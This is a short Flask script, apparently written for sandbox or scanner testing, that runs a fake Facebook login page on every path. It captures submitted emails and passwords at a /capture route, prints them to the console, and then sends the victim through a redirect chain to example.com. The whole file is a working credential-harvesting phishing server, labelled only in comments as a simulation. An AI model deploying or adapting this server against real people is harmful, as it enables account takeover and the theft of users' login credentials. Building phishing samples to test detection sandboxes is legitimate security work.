from flask import Flask, request, send_file, redirect

app = Flask(__name__)

# 🧠 Serve the phishing page for any GET route
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    print(f"[Request] Path: /{path or ''} | UA: {request.headers.get('User-Agent')}")
    return send_file("phishing_facebook.html")

# 🪤 Capture the login credentials
@app.route('/capture', methods=['POST'])
def capture_login():
    email = request.form.get("email")
    password = request.form.get("pass")
    print(f"[Phish Simulation] Captured login -> Email: {email}, Password: {password}")
    return redirect("/redir1")

# 🔁 Redirect chain simulation
@app.route('/redir1', methods=['GET'])
def redirect_step_1():
    print("[Redirect] Step 1 triggered")
    return redirect("/redir2")

@app.route('/redir2', methods=['GET'])
def redirect_step_2():
    print("[Redirect] Step 2 triggered")
    return redirect("https://example.com")

if __name__ == '__main__':
    print("🚀 Fake phishing server running at http://localhost:8888")
    print("🔗 Submit to sandbox: http://192.168.1.3:8888/")
    app.run(host="0.0.0.0", port=8888)

